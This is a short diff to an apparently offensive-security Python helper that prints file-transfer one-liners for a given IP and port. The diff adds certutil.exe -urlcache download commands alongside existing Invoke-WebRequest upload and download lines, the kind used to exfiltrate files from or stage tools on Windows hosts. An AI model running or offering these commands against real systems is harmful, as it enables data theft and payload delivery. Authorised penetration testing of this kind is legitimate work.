@@ -88,10 +88,12 @@ def main():
         print(f"Invoke-WebRequest -Uri http://{ip}:{port}/{file} -Method PUT -InFile {file}")
         print(f"Invoke-WebRequest -Uri http://{ip}:{port}/{file} -Method POST -InFile {file}")
         print(f"iwr -uri http://{ip}:{port}/{file} -Outfile {file}")
+        print(f"certutil.exe -urlcache -split -f http://{ip}:{port}/{file} {file}")
     else:
         print(f"Invoke-WebRequest -Uri http://{ip}:{port}/<outfile> -Method PUT -InFile <file_path>")
         print(f"Invoke-WebRequest -Uri http://{ip}:{port}/<outfile> -Method POST -InFile <file_path>")
         print(f"iwr -uri http://{ip}:{port}/<file_path> -Outfile <outfile>")
+        print(f"certutil.exe -urlcache -split -f http://{ip}:{port}/<file_path> <outfile>")
 
 
     # wget commands
